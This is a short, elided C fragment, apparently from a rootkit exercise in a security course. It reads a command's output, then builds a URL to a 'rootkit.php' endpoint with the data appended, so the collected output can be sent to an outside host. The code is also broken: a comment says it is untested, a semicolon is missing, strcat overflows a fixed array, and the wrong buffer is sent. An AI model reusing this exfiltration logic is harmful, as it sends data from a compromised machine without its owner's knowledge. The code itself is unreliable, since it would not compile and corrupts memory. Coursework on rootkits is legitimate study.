...
void replace_whitespace_with_underscores(char* buffer) {
    int i;
...
{ 
  // haven't had time to test / run this code before submission
  char buffer[1024];
  char output[1024];
  ...
  while (fgets(buffer, MAX_BUF_SIZE, fp) != NULL) {
      strncat(output, buffer, MAX_BUF_SIZE - strlen(output) - 1);
  }
  pclose(fp);
  replace_whitespace_with_underscores(buffer);

  char url[] = "https://andromeda.cs.virginia.edu/rootkit.php?userid=cbf2xv&data="
  strcat(url, buffer);
  char command[1024];
